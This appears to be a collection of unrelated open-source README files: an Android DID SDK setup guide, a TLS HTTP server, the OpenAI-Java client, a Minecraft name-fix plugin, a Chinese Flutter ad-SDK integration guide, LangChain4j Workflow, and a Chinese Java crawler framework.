        implementation 'org.bitcoinj:bitcoinj-core:0.15.7'

        implementation 'com.madgag.spongycastle:core:1.54.0.0'
        implementation 'com.madgag.spongycastle:prov:1.54.0.0'
        implementation 'com.madgag.spongycastle:pkix:1.54.0.0'
        implementation 'com.madgag.spongycastle:pg:1.54.0.0'
        
        api ""androidx.room:room-runtime:2.6.1""
        annotationProcessor ""androidx.room:room-compiler:2.6.1""
    }
    ```

    b. Check the minSdkVersion and targetSdkVersion settings
   - In the android section of the build.gradle file, verify the minSdkVersion and targetSdkVersion settings and modify them to meet the project requirements.

    ```groovy
    android {
        compileSdkVersion 34

        defaultConfig {
            applicationId ""org.omnione.did.ca""
            minSdkVersion 26
            targetSdkVersion 34
            versionCode 1
            versionName ""1.0""
        }
    }
    ```

4. Import and Usage

    a. Modify the URLs Class
   - In the `Config.java` file of the project, update the URL information for each service provider:
    ```java
    public class Config {
        public static final String TAS_URL = ""http://192.168.3.130:8090"";
        public static final String VERIFIER_URL = ""http://192.168.3.130:8092"";
        public static final String CAS_URL = ""http://192.168.3.130:8094"";
        public static final String WALLET_URL = ""http://192.168.3.130:8095"";
        public static final String API_GATEWAY_URL = ""http://192.168.3.130:8093"";
        public static final String DEMO_URL = ""http://192.168.3.130:8099"";
    }
    ```

    b. Using the did-client-sdk-aos Module
   - At the top of the Java/Kotlin file where you want to use the class or method, import as follows:
    ```java
    import  org.omnione.did.sdk.core;
    import  org.omnione.did.sdk.utility;
    import  org.omnione.did.sdk.datamodel;
    import  org.omnione.did.sdk.wallet;
    import  org.omnione.did.sdk.communication;
    ```

   - You can now use the features provided by the did-client-sdk-aos module in your source code:
    ```java
    try {
        String hWalletToken = WalletAPI.createWalletToken(WWALLET_TOKEN_PURPOSE.LIST_VC);

        List<Credential> credentials = WalletAPI.getAllCredentials(hWalletToken);

        if (credentials != null) {
            for (Credential vc : credentials) {
                Log.d(""VC"", vc.toJson());
            }
        }

    } catch (WalletException e) {
        Log.e(""WalletException"", ""Message: "" + e.getMessage());
    } catch (CommunicationException e) {
        Log.e(""CommunicationException"", ""Message: "" + e.getMessage());
    } catch (UtilityException e) {
        Log.e(""UtilityException"", ""Message: "" + e.getMessage());
    }
    ```

5. Build and Test

    a. Build and Run
   - Click the Run button at the top of Android Studio to build and run the project. If any errors occur during the build process, check the Build window for error details and resolve the issues.

    b. Test
   - Once the build is successfully completed, run the app to ensure that the did-client-sdk-aos library functions correctly. Use Android Studio’s debugger and logs to identify any potential issues.

6. Troubleshooting
   - If the did-client-sdk-aos library is not properly loaded or functioning, check the following:

        - Correct Dependencies: Verify that the dependencies are correctly set in the `build.gradle` file.
        - SDK Version: Ensure that the project’s minSdkVersion and targetSdkVersion are compatible with the SDK being used.
        - Permissions: Check that the necessary permissions are correctly set in the AndroidManifest.xml file.

*The fuel that'll ignite your application.*

A programmable TLS HTTP/1.1 server written with no dependencies.

## Key Features
* SSL/TLS only (using `SSLServerSocket`)
* No magic with visible control flow
* Light weight
* No Dependencies
* Virtual Threads

## Example

Below is an example implementation of a Kindling Server with a simple request handler that responds with a JSON object
to a `GET` request on the `/` resource.

```java
public class Main {
    public static void main(String[] args) throws KindlingException {
        KindlingServer server = KindlingServer.getInstance();
        server.installRequestHandler(new RequestHandler() {
            /**
             * Tell the server what type of request this handler can work with
             */
            @Override
            public boolean accepts(HttpRequest httpRequest) throws KindlingException {
                return httpRequest.getHttpMethod().equals(HttpMethod.GET) && httpRequest.getResource().equals(""/"");
            }

            /**
             * Do your business logic here
             */
            @Override
            public HttpResponse handle(HttpRequest httpRequest) throws KindlingException {
                return new HttpResponse.Builder()
                        .status(HttpStatus.OK)
                        .headers(new HashMap<>() {
                            {
                                put(""Content-Type"", ""application/json"");
                            }
                        })
                        .content(""{\""key\"": \""value\""}"")
                        .build();
            }
        });

        // serve our server
        server.serve(8443, Path.of(""mykeystore.p12""), ""password"");
    }
}
```

Let's break down the components above.

* KindlingServer
  * The singleton that contains the application context
  * Manages the `SSLServerSocket` and the virtual thread that is assigned to each request
* RequestHandler
  * Accepts
    * Called when a request is received
    * Return a boolean telling the server if we can handle this request
  * Handle
    * If the `accepts()` method returns true, `handle()` is called
    * Do your business logic here, returning an `HttpResponse`

> ⚠️OpenAI has deprecated all Engine-based APIs. See [Deprecated Endpoints](https://github.com/TheoKanning/openai-java#deprecated-endpoints) below for more info.

# OpenAI-Java
Java libraries for using OpenAI's GPT apis. Supports GPT-3, ChatGPT, and GPT-4.

Includes the following artifacts:
- `api` : request/response POJOs for the GPT APIs.
- `client` : a basic retrofit client for the GPT endpoints, includes the `api` module
- `service` : A basic service class that creates and calls the client. This is the easiest way to get started.

as well as an example project using the service.

## Supported APIs
- [Models](https://platform.openai.com/docs/api-reference/models)
- [Completions](https://platform.openai.com/docs/api-reference/completions)
- [Chat Completions](https://platform.openai.com/docs/api-reference/chat/create)
- [Edits](https://platform.openai.com/docs/api-reference/edits)
- [Embeddings](https://platform.openai.com/docs/api-reference/embeddings)

- [Legacy Fine-Tunes](https://platform.openai.com/docs/guides/legacy-fine-tuning)

## Importing

### Gradle
`implementation 'com.theokanning.openai-gpt3-java:<api|client|service>:<version>'`

### Maven
```xml
   <dependency>
    <groupId>com.theokanning.openai-gpt3-java</groupId>
    <artifactId>{api|client|service}</artifactId>
    <version>version</version>       
   </dependency>
```

## Usage
### Data classes only
If you want to make your own client, just import the POJOs from the `api` module.
Your client will need to use snake case to work with the OpenAI API.

### Retrofit client
If you're using retrofit, you can import the `client` module and use the [OpenAiApi](client/src/main/java/com/theokanning/openai/OpenAiApi.java).  
You'll have to add your auth token as a header (see [AuthenticationInterceptor](client/src/main/java/com/theokanning/openai/AuthenticationInterceptor.java))
and set your converter factory to use snake case and only include non-null fields.

### OpenAiService
If you're looking for the fastest solution, import the `service` module and use [OpenAiService](service/src/main/java/com/theokanning/openai/service/OpenAiService.java).  

> ⚠️The OpenAiService in the client module is deprecated, please switch to the new version in the service module.
```java
OpenAiService service = new OpenAiService(""your_token"");
CompletionRequest completionRequest = CompletionRequest.builder()
        .prompt(""Somebody once told me the world is gonna roll me"")
        .model(""babbage-002"""")
        .echo(true)
        .build();
service.createCompletion(completionRequest).getChoices().forEach(System.out::println);
```

### Customizing OpenAiService
If you need to customize OpenAiService, create your own Retrofit client and pass it in to the constructor.
For example, do the following to add request logging (after adding the logging gradle dependency):

```java
ObjectMapper mapper = defaultObjectMapper();
OkHttpClient client = defaultClient(token, timeout)
        .newBuilder()
        .interceptor(HttpLoggingInterceptor())
        .build();
Retrofit retrofit = defaultRetrofit(client, mapper);

OpenAiApi api = retrofit.create(OpenAiApi.class);
OpenAiService service = new OpenAiService(api);
```

### Adding a Proxy
To use a proxy, modify the OkHttp client as shown below:
```java
ObjectMapper mapper = defaultObjectMapper();
Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(host, port));
OkHttpClient client = defaultClient(token, timeout)
        .newBuilder()
        .proxy(proxy)
        .build();
Retrofit retrofit = defaultRetrofit(client, mapper);
OpenAiApi api = retrofit.create(OpenAiApi.class);
OpenAiService service = new OpenAiService(api);
```

### Functions
You can create your functions and define their executors easily using the ChatFunction class, along with any of your custom classes that will serve to define their available parameters. You can also process the functions with ease, with the help of an executor called FunctionExecutor.

First we declare our function parameters:
```java
public class Weather {
    @JsonPropertyDescription(""City and state, for example: León, Guanajuato"")
    public String location;
    @JsonPropertyDescription(""The temperature unit, can be 'celsius' or 'fahrenheit'"")
    @JsonProperty(required = true)
    public WeatherUnit unit;
}
public enum WeatherUnit {
    CELSIUS, FAHRENHEIT;
}
public static class WeatherResponse {
    public String location;
    public WeatherUnit unit;
    public int temperature;
    public String description;
    
    // constructor
}
```

Next, we declare the function itself and associate it with an executor, in this example we will fake a response from some API:
```java
ChatFunction.builder()
        .name(""get_weather"")
        .description(""Get the current weather of a location"")
        .executor(Weather.class, w -> new WeatherResponse(w.location, w.unit, new Random().nextInt(50), ""sunny""))
        .build()
```

Then, we employ the FunctionExecutor object from the 'service' module to assist with execution and transformation into an object that is ready for the conversation:
```java
List<ChatFunction> functionList = // list with functions
FunctionExecutor functionExecutor = new FunctionExecutor(functionList);

List<ChatMessage> messages = new ArrayList<>();
ChatMessage userMessage = new ChatMessage(ChatMessageRole.USER.value(), ""Tell me the weather in Barcelona."");
messages.add(userMessage);
ChatCompletionRequest chatCompletionRequest = ChatCompletionRequest
        .builder()
        .model(""gpt-3.5-turbo-0613"")
        .messages(messages)
        .functions(functionExecutor.getFunctions())
        .functionCall(new ChatCompletionRequestFunctionCall(""auto""))
        .maxTokens(256)
        .build();

ChatMessage responseMessage = service.createChatCompletion(chatCompletionRequest).getChoices().get(0).getMessage();
ChatFunctionCall functionCall = responseMessage.getFunctionCall(); // might be null, but in this case it is certainly a call to our 'get_weather' function.

ChatMessage functionResponseMessage = functionExecutor.executeAndConvertToMessageHandlingExceptions(functionCall);
messages.add(response);
```
> **Note:** The `FunctionExecutor` class is part of the 'service' module.

You can also create your own function executor. The return object of `ChatFunctionCall.getArguments()` is a JsonNode for simplicity and should be able to help you with that.

For a more in-depth look, refer to a conversational example that employs functions in: [OpenAiApiFunctionsExample.java](example/src/main/java/example/OpenAiApiFunctionsExample.java).
Or for an example using functions and stream: [OpenAiApiFunctionsWithStreamExample.java](example/src/main/java/example/OpenAiApiFunctionsWithStreamExample.java)

### Streaming thread shutdown
If you want to shut down your process immediately after streaming responses, call `OpenAiService.shutdownExecutor()`.  
This is not necessary for non-streaming calls.

## Running the example project
All the [example](example/src/main/java/example/OpenAiApiExample.java) project requires is your OpenAI api token
```bash
export OPENAI_TOKEN=""sk-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX""
```
You can try all the capabilities of this project using:
```bash
./gradlew runExampleOne
```
And you can also try the new capability of using functions:
```bash
./gradlew runExampleTwo
```
Or functions with 'stream' mode enabled:
```bash
./gradlew runExampleThree
```

## FAQ
### Does this support GPT-4?
Yes! GPT-4 uses the ChatCompletion Api, and you can see the latest model options [here](https://platform.openai.com/docs/models/gpt-4).  
GPT-4 is currently in a limited beta (as of 4/1/23), so make sure you have access before trying to use it.

### Does this support functions?
Absolutely! It is very easy to use your own functions without worrying about doing the dirty work.
As mentioned above, you can refer to [OpenAiApiFunctionsExample.java](example/src/main/java/example/OpenAiApiFunctionsExample.java) or 
[OpenAiApiFunctionsWithStreamExample.java](example/src/main/java/example/OpenAiApiFunctionsWithStreamExample.java) projects for an example. 

### Why am I getting connection timeouts?
Make sure that OpenAI is available in your country.

### Why doesn't OpenAiService support x configuration option?
Many projects use OpenAiService, and in order to support them best I've kept it extremely simple.  
You can create your own OpenAiApi instance to customize headers, timeouts, base urls etc.  
If you want features like retry logic and async calls, you'll have to make an `OpenAiApi` instance and call it directly instead of using `OpenAiService`

## Deprecated Endpoints
OpenAI has deprecated engine-based endpoints in favor of model-based endpoints. 
For example, instead of using `v1/engines/{engine_id}/completions`, switch to `v1/completions` and specify the model in the `CompletionRequest`.
The code includes upgrade instructions for all deprecated endpoints.

I won't remove the old endpoints from this library until OpenAI shuts them down.

egecanakincioglu/name-fix-plugin,main,"# 💡 CartelNameFix Java Minecraft Plugin

## 🛠️ What Does This Plugin Do?

This plugin is designed to prevent players from exploiting permission or account bugs to disrupt the economic or authority balance of the server. When players join the server with the name ""Cartel,"" this name is recorded in a MySQL database. After being registered, permission matching is done in the tables, associating the name with the permissions of the player. Some plugins, due to certain bugs, mistakenly apply the permissions of the ""Cartel"" account to anyone trying to enter the game with the name ""cartel."" This system solves that issue precisely.

## 🚀 How Does This Plugin Solve the Problem?

The issue arises from various plugins or vulnerabilities in older Minecraft versions. This plugin addresses it by creating an SQL database to control connection requests of players joining the game based on the data in the SQL. If such an account does not exist in the plugin's SQL, it will be created, and default permissions will be assigned to the newly created accounts. Subsequently, if administrators assign you administrative permissions in the game, it will be updated in the database as well. In short, if there's an account named ""Cartel,"" you can no longer create an account with the name ""cartel.""

## 🛠️ What's Needed for Installation?

Currently, it doesn't depend on any other plugin, so it will work by simply placing the CartelNameFix.jar file into the ./plugins directory. However, for clarification:

- Navigate to the ./plugins directory of your server and drag the CartelNameFix.jar file into it.
- Start your server and monitor the console. You'll see informative messages indicating the plugin has been loaded.
- If the plugin loads successfully, it will create a file and an associated database file. All name data for your server will be stored here.
- This way, you'll be free from all name bugs.

## 接入方法

下面将分成Android和iOS一些配置，**Android和iOS接入Flutter的步骤都是相同的**；

### Android接入方法

Android的接入分成2个步骤

1、配置AndroidManifest，包括添加权限和provider；

2、Gradle需要的配置；

#### 步骤1：配置AndroidManifest

1、需要再AndroidManifest文件中添加以下权限；

```xml
<uses-permission android:name=""android.permission.INTERNET"" /> 
<uses-permission android:name=""android.permission.ACCESS_NETWORK_STATE"" /> 
<uses-permission android:name=""android.permission.WRITE_EXTERNAL_STORAGE"" />   
<uses-permission android:name=""android.permission.READ_EXTERNAL_STORAGE"" />
<uses-permission android:name=""android.permission.REQUEST_INSTALL_PACKAGES"" /> 
<uses-permission android:name=""android.permission.READ_PHONE_STATE"" />  
```

2、资源文件配置，下面只包括了穿山甲和优量汇的配置，如果单独需要穿山甲或者优量汇，可以分别单独添加配置，如果需要配置快手、百度等平台请参考[如何接入快手、百度等平台的广告](https://www.csjplatform.com/union/media/union/download/detail?id=142&docId=27562&osType=android)

* 穿山甲和优量汇的provider配置，具体可以参考flutter_youni_gromore的Android demo

```xml
<!-- 穿山甲 start================== -->
        <provider
            android:name=""com.bytedance.sdk.openadsdk.TTFileProvider""
            android:authorities=""${applicationId}.TTFileProvider""
            android:exported=""false""
            android:grantUriPermissions=""true"">
            <meta-data
                android:name=""android.support.FILE_PROVIDER_PATHS""
                android:resource=""@xml/pangle_file_paths"" />
        </provider>

        <provider
            android:name=""com.bytedance.sdk.openadsdk.multipro.TTMultiProvider""
            android:authorities=""${applicationId}.TTMultiProvider""
            android:exported=""false"" />
        <!-- 穿山甲 end================== -->

<!-- GDT start================== -->
<!-- targetSDKVersion >= 24时才需要添加这个provider。provider的authorities属性的值为${applicationId}.fileprovider，请开发者根据自己的${applicationId}来设置这个值，例如本例中applicationId为""com.qq.e.union.demo""。 -->
        <provider
            android:name=""com.qq.e.comm.GDTFileProvider""
            android:authorities=""${applicationId}.gdt.fileprovider""
            android:exported=""false""
            android:grantUriPermissions=""true"">
            <meta-data
                android:name=""android.support.FILE_PROVIDER_PATHS""
                android:resource=""@xml/gdt_file_path"" />
        </provider>    
<activity
        android:name=""com.qq.e.ads.PortraitADActivity""
        android:configChanges=""keyboard|keyboardHidden|orientation|screenSize""
        android:screenOrientation=""portrait"" />
    <activity
        android:name=""com.qq.e.ads.LandscapeADActivity""
        android:configChanges=""keyboard|keyboardHidden|orientation|screenSize""
        android:screenOrientation=""landscape""
        tools:replace=""android:screenOrientation"" />

    <!-- 声明SDK所需要的组件 -->
    <service
        android:name=""com.qq.e.comm.DownloadService""
        android:exported=""false"" />
    <!-- 请开发者注意字母的大小写，ADActivity，而不是AdActivity -->

    <activity
        android:name=""com.qq.e.ads.ADActivity""
        android:configChanges=""keyboard|keyboardHidden|orientation|screenSize"" />
    <!-- GDT end================== -->
```

* 这个步骤是配置`android.support.FILE_PROVIDER_PATHS`需要额xml文件，res/xml目录下添加两个个文件，文件名称是`pangle_file_paths.xml`和`gdt_file_path.xml`

  下面是`pangle_file_paths.xml`文件内容

  ```xml
   <?xml version=""1.0"" encoding=""utf-8""?>
   <paths>
       <external-path name=""tt_external_root"" path=""."" />
       <external-path name=""tt_external_download"" path=""Download"" />
       <external-files-path name=""tt_external_files_download"" path=""Download"" />
       <files-path name=""tt_internal_file_download"" path=""Download"" />
       <cache-path name=""tt_internal_cache_download"" path=""Download"" />
   </paths>
  ```
  
  下面是`gdt_file_path.xml`文件内容
  
  ```xml
  <paths>
      <!-- 这个下载路径也不可以修改，必须为com_qq_e_download -->
      <external-cache-path
          name=""gdt_sdk_download_path1""
          path=""com_qq_e_download"" />
      <cache-path
          name=""gdt_sdk_download_path2""
          path=""com_qq_e_download"" />
  </paths>
  ```
  
  #### 步骤2：配置Gradle
  
  1、在rallprojects和buildscript下面添穿上甲的maven
  
  ```groovy
  buildscript {
      repositories {
          maven {
              url ""https://artifact.bytedance.com/repository/pangle""
          }
      }
  }
  
  rootProject.allprojects {
      repositories {
          maven {
              url ""https://artifact.bytedance.com/repository/pangle""
          }
      }
  }
  ```
  
  2、添加依赖库
  
  ```groovy
  dependencies {
      implementation ""com.pangle.cn:mediation-sdk:5.9.2.8""//融合基础包，必须引入
    
      implementation ""com.qq.e.union:union:4.540.1410""// 添加优量汇的广告SDK
    	implementation ""com.pangle.cn:mediation-gdt-adapter:4.540.1410.3""//添加优量汇的adapter
  } 
  ```
  
  ### iOS接入方法
  
  Android的接入分成2个步骤
  
  1、添加pod依赖；
  
  2、在`Info.plist`文件中添加权限；
  
  #### 步骤1：添加pod依赖
  
  在`Podfile`文件中添加穿山甲和优量汇的pod依赖，可以参考flutter_youni_gromore下的iOSdemo
  
  ```pascal
  target 'Runner' do
    pod 'CSJMGdtAdapter', '4.14.63.0'
    pod 'GDTMobSDK','4.14.63'
  end
  ```
  
  #### 步骤2：添加权限
  
  在iOS14.5以后想要依旧能使用IDFA，建议开发者在初始化聚合SDK之前获取ATT授权，以便允许用户授权跟踪权限。
  
  首先，需要在App层级的info.plist里添加ATT权限描述：
  
  ```xml
  <key>NSUserTrackingUsageDescription</key>
  	<string>ATT权限使用说明，需要开发者自行设置描述</string>
  ```
  
  ### Flutter集成步骤
  
  #### pubspec.yaml
  ```Dart
  flutter_youni_gromore: ^1.0.0
  ```
  #### 引入
  ```Dart
  import 'package:flutter_youni_gromore/flutter_youni_gromore.dart';
  ```
  
  ## 使用
  
  ### SDK初始化
  ```Dart
  WidgetsFlutterBinding.ensureInitialized();
  setGromoreEvent();//设置广告监听事情，这个事件包括一些错误事件、激励视频事件
  init().then((value) {
      if (value) {
         //广告初始化成功了执行的一些动作和方法
      }
  });
  
   Future<bool> init() async {
      try {
        //这个是广告的初始化事件
        bool result = await FlutterYouniGromore.init(
          ""广告id""
        );
        return result;
      } on PlatformException catch (e) {
      }
      return false;
    }
  ```
  
  ### 广告监听
  
  ```dart
  Future<void> setGromoreEvent() async {
      FlutterYouniGromore.onEventListener((event) {
        //event中最重要的两个属性是adId和action，adId就是广告位的id，action对应是广告位的行为
        //行为包括：广告错误、广告加载成功、广告填充、广告曝光、广告关闭（计时结束或者用户点击关闭）、广告点击、广告跳过、广告播放或计时完毕、获得广告激励 9个行为
        if (event is GromoreErrorEvent) {
        
        } else if (event is GromoreRewardEvent) {
   
        }
      });
    }
  ```
  
  下面是广告行为对应的名称：
  
  ```dart
  	///广告错误
    static const String onAdError = 'onAdError';
    ///广告加载成功
    static const String onAdLoaded = 'onAdLoaded';
    ///广告填充
    static const String onAdPresent = 'onAdPresent';
    ///广告曝光
    static const String onAdExposure = 'onAdExposure';
    ///广告关闭（计时结束或者用户点击关闭）
    static const String onAdClosed= 'onAdClosed';
    ///广告点击
    static const String onAdClicked = 'onAdClicked';
    ///广告跳过
    static const String onAdSkip = 'onAdSkip';
    ///广告播放或计时完毕
    static const String onAdComplete = 'onAdComplete';
    ///获得广告激励
    static const String onAdReward = 'onAdReward';
  ```
  
  下面是利用广告监听，展示完闪屏跳转到首页的示例代码
  
  ```dart
  Future<void> setAdEvent() async {
      FlutterYouniGromore.onEventListener((event) {
        if (event.adId == ""开屏广告位id"") {//先判断是开屏的广告广告位
          if (event.action == GromoreEventActions.onAdClosed ||
              event.action == GromoreEventActions.onAdSkip ||
              event.action == GromoreEventActions.onAdComplete ||
              event.action == GromoreEventActions.onAdError) {//判断各种的事件类型，符合这些条件的情况跳转到首页
            gotoMain();//跳转到首页
          }
        }
      });
    }
  ```
  
  ### 开屏广告
  
  ```dart
  Future<void> showSplash() async {
      try {
        bool result = await FlutterYouniGromore.showSplash(""广告位id"");
      } on PlatformException catch (e) {
      }
    }
  ```
  
  ### 插屏广告
  
  ```dart
   Future<void> showInterstitial() async {
      try {
        bool result = await FlutterYouniGromore.showInterstitial(""广告位id"");
      } on PlatformException catch (e) {
      }
    }
  ```
  
  ### 激励视频广告
  
  ```dart
    Future<void> showReward() async {
      if (!jumpCondition()) {
        return;
      }
      try {
        bool result = await FlutterYouniGromore.showReward(
           ""广告位id"",
        );
      } on PlatformException catch (e) {
      }
    }
  ```
  ### Banner(横幅)广告
  ```dart
   GromoreBannerWidget(
                  codeId: ""广告位id"",
                  width: 300,//广告的宽度
                  height: 150,//广告的高度
                ),

Build advanced java applications with AI based on flexible stateful workflows 💡

## Overview
LangChain4j Workflow is a dynamic, stateful workflow engine crafted as a Java library, drawing inspiration from graph network libraries. It empowers developers with granular control over the flow and state of their applications. This engine is a game-changer for building sophisticated AI applications, such as RAG-based approaches using modern paradigms and agent architectures, where the application's flow and state are pivotal. It enables the crafting of custom behavior, leading to a significant reduction in hallucinations and an increase in response reliability

LangChain4j Workflow is influenced by [LangGraph](https://langchain-ai.github.io/langgraph/tutorials/introduction/), [Graphviz](https://graphviz.gitlab.io/Gallery/directed/) and [Apache Beam](https://beam.apache.org/), and it offers a multitude of benefits. It allows you to define custom workflows as a graph, iteratively, with cycles, flexibility, control, and conditional decisions. These benefits are indispensable for building advanced AI applications.

LangChain4j Workflow is designed to integrate seamlessly with [LangChain4j](https://docs.langchain4j.dev/), enabling you to define custom workflows using all the features that LangChain4j offers. This integration could provide a comprehensive toolset for building advanced AI applications.

> 🌟 **Starring me**: If you find this repository beneficial, don't forget to give it a star! 🌟 Your support increases its chances of being merged with the LangChain4j codebase. It's a simple way to show your appreciation and help this project grow!

## Key Features
- **Stateful**: LangChain4j Workflow is a stateful engine, enabling you to design custom states as POJO and transitions. This feature provides a robust foundation for managing the flow and state of your application.
- **Graph-Based**: The workflow is graph-based, offering the flexibility to define custom workflows with multiple directions such as one-way, round trip, cyclic, and more. This feature allows for intricate control over the flow of your application.
- **Flexible**: LangChain4j Workflow is designed with flexibility in mind. You can define custom workflows and append them at any point in other RAG paradigms, such as Modular RAG. This flexibility allows for a high degree of customization.
- **Iterative**: The engine supports the implementation of loops and conditionals in your custom workflows. This feature allows for complex logic and flow control within your workflows.
- **Streaming Support**: LangChain4j Workflow supports streaming outputs as they are produced by each node. This feature allows for real-time processing and response in your application.
- **Integration**: LangChain4j Workflow is designed to integrate seamlessly with [LangChain4j](https://docs.langchain4j.dev/), enabling you to define custom workflows using all the features that LangChain4j offers. This integration provides a comprehensive toolset for building advanced AI applications.
- **Visualization**: The engine supports the generation of workflow images. This feature allows you to visualize the flow computed of your app workflow. By Default it uses `Graphhviz` lib to generate the image, but you implement your own image generator on `GraphImageGenerator.java` interface.

## Installation
```shell
mvn clean package install
```
## Example
In **LangChain4j Workflow**, the notion of state plays a pivotal role. Every execution of the graph initiates a state, which is then transferred among the nodes during their execution. Each node, after its execution, updates this internal state with its own return value. The method by which the graph updates its internal state is determined by user-defined functions.

Add the following dependency to your `pom.xml` file:
```xml
<dependency>
  <groupId>dev.langchain4j</groupId>
  <artifactId>langchain4j-workflow</artifactId>
  <version>0.1.0</version> <!--Change to the latest version-->
</dependency>
```
Define a stateful bean with fields that will be used to store the state of the workflow:
```java
// Define a stateful bean
public class MyStatefulBean {
  int value = 0;
}
```

Create a simple workflow with 4 nodes and conditional edges:
```java
public class Example {
  public static void main(String[] args) {
    
    MyStatefulBean myStatefulBean = new MyStatefulBean();

    // Define functions that determines statefulBean state
    Function<MyStatefulBean, String> node1Func = obj -> {
      obj.value +=1;
      System.out.println(""Node 1: ["" + obj.value + ""]"");
      return ""Node1: function proceed"";
    };
    Function<MyStatefulBean, String> node2Func = obj -> {
      obj.value +=2;
      System.out.println(""Node 2: ["" + obj.value + ""]"");
      return ""Node2: function proceed"";
    };
    Function<MyStatefulBean, String> node3Func = obj -> {
      obj.value +=3;
      System.out.println(""Node 3: ["" + obj.value + ""]"");
      return ""Node3: function proceed"";
    };
    Function<MyStatefulBean, String> node4Func = obj -> {
      obj.value +=4;
      System.out.println(""Node 4: ["" + obj.value + ""]"");
      return ""Node4: function proceed"";
    };

    // Create the nodes and associate them with the functions to be used during execution.
    Node<MyStatefulBean, String> node1 = Node.from(""node1"", node1Func);
    Node<MyStatefulBean, String> node2 = Node.from(""node2"", node2Func);
    Node<MyStatefulBean, String> node3 = Node.from(""node3"", node3Func);
    Node<MyStatefulBean, String> node4 = Node.from(""node4"", node4Func);


    // Create workflow
    StateWorkflow<MyStatefulBean> workflow = DefaultStateWorkflow.<MyStatefulBean>builder() 
            .statefulBean(myStatefulBean)
            .addNodes(Arrays.asList(node1, node2, node3))
            .build();

    // You can add more nodes after workflow build. E.g. node4
    workflow.addNode(node4);

    // Define edges
    workflow.putEdge(node1, node2);
    workflow.putEdge(node2, node3);
    // Conditional edge
    workflow.putEdge(node3, Conditional.eval(obj -> {
      System.out.println(""Stateful Value ["" + obj.value + ""]"");
      if (obj.value > 6) {
        return node4;
      } else {
        return node2;
      }
    }));
    workflow.putEdge(node4, WorkflowStateName.END);

    // Define which node to start
    workflow.startNode(node1);

    // Run workflow normally
    workflow.run();
    // OR
    // Run workflow in streaming mode
    workflow.runStream(node -> {
      System.out.println(""Processing node: "" + node.getName());
    });

    // Print all computed transitions
    String transitions = workflow.prettyTransitions();
    System.out.println(""Transitions: \n"");
    System.out.println(transitions);

    // Generate workflow image
    workflow.generateWorkflowImage(""image/my-workflow.svg"");
    // workflow.generateWorkflowImage(); // if you use this method, it'll use by default the root path and default image name.
  }
}
```
Now you can check the output of the workflow execution.

```shell
STARTING workflow in stream mode..
Processing node: node1
Node 1: [1]
Processing node: node2
Node 2: [3]
Processing node: node3
Node 3: [6]
Stateful Value [6]
Processing node: node2
Node 2: [8]
Processing node: node3
Node 3: [11]
Stateful Value [11]
Processing node: node4
Node 4: [15]
Reached END state
```
You can print all computed transitions:

```shell
START -> node1 -> node2 -> node3 -> node2 -> node3 -> node4 -> END
```
You can generate a workflow image with all computed transitions:

![Workflow Image](image/my-workflow.svg)

### 🏆 10万行源码，3A史诗巨献
该仓库为Java 11实现版本（由C/C++版本重构），非GUI大部分不直接基于第三方框架。
此外由于本项目工程量、复杂度和工作量较大，本人精力、能力有限，错误和功能完整性不足是不可避免的，还希望各位读者大佬批评指正。\
最后，由于本人精力和工作时间等问题，该公开版本为beta版本，一部分功能未完全实现，后续会不断迭代，欢迎关注。

## 二、🧬 编译、使用
### 编译
- 项目使用Maven管理，使用jdk11以上版本即可运行。
- 编译得到jar包，即插即用，随意部署。
- 或使用 IntelliJ IDEA 直接打开即可。

### 最小系统使用
- 无需特意配置环境变量等信息。
- 系统配置文件，默认位于""./system/setup/..""
```json5
    ""Orchestration""         : {
      ""Name"": ""ServgramOrchestrator"",
      ""Type"": ""Parallel"", // Enum: { Sequential, Parallel, Loop }

      // Servgram-Classes scanning package-scopes
      ""ServgramScopes"": [
        ""com.sauron.radium.heistron""
      ],

      ""Transactions"": [
        { ""Name"": ""Heist"", ""Type"": ""Sequential"", ""Primary"": true }
      ]
    }
```
- 默认启动 `Heist` （爬虫）任务
- 检查 `Heist` 小程序配置，默认位于""./system/setup/heist.json5""
```json5
    ""Orchestration""    : {
        ""Name"": ""HeistronOrchestrator"",
        ""Type"": ""Parallel"", // Enum: { Sequential, Parallel, Loop }
    
        ""DirectlyLoad"" : {
          ""Prefix"": [],
          ""Suffix"": [ ""Heist"" ]
        },
    
        ""ServgramScopes"": [
          ""com.sauron.shadow.heists"",
          ""com.sauron.shadow.chronicle""
        ],
    
        // 修改这里，可运行例程 'Void' , 最小系统演示
        ""Transactions"": [
          { ""Name"": ""Void"", ""Type"": ""Sequential"" /* Enum: { Sequential, Parallel, SequentialActions, ParallelActions, LoopActions }*/ },
        ]
    }
```
- 检查 `Void` 小小程序配置，默认位于""./system/setup/heists/Void.json5""，原则上注意大小写
```json5
    ""Orchestration""         : {
        ""Name"": ""VoidOrchestrator"",
        ""Type"": ""Parallel"", // Enum: { Sequential, Parallel, Loop }
    
        ""Transactions"": [
          { ""Name"": ""Jesus"", ""Type"": ""Sequential""  },
          { ""Name"": ""Satan"", ""Type"": ""Sequential""  },
          { ""Name"": ""Rick"" , ""Type"": ""Sequential""  }
        ]
    }
```
- 正常启动，将开始本地流水线序列调度 ""Jesus""、""Satan""、""Rick""三个大任务和其子任务。

## 七、🐱 题外话
### 7.1 FQA
##### 7.1.1. 更新时间？
很遗憾已经上班牛马了，更新速率减低到(3h/pd)，但每周仍然保证更新！
##### 7.1.2. Bean Nuts XXX是啥？
系统命名法，Bean是我第一个上网冲浪网名，Nuts是计算机领域根项目，Pinecone等坚果是子领域项目（如面向框架、面向业务等）,后面是子项目。
##### 7.1.3. 为毛用Java？
本项目一开始就是C/C++写的，但是由于该项目难度和工作量，一直找不到合适的人一起开发，且维护成本随项目迭代成指数增长，心有余而力不足，但后续根据时间可能出Go版本。
##### 7.1.4. 这种偏底层项目Java有无性能影响？
底层上肯定有一定影响，但Java是工业界非常优秀的实践之一，且那一点点Tiny性能损失与指数级代码维护相比，以人为本，问题不大。
##### 7.1.5. 这种项目怎么维护、学习？
数仓和这类底层项目建设是系统工程，实践中很少有个人或非商业团队愿意耗资数万搭建小数仓体系的，哪怕在公司上班的同学没有一定职级也很难接触海量真实大数据。
实践中原始爬下来的海量4K小文件（或用户采集数据）->数据结构化处理->入库入仓->大数据检索->调用大模型API或生成图谱类->并发检索等完整的数据血缘、链路是非常系统、昂贵且复杂的建设。
且我们不像大公司一样财大气粗，服务器算力和不要钱一样，因此技术选型不能直接照搬中台那一套，我们需要考虑非常多的真实场景。
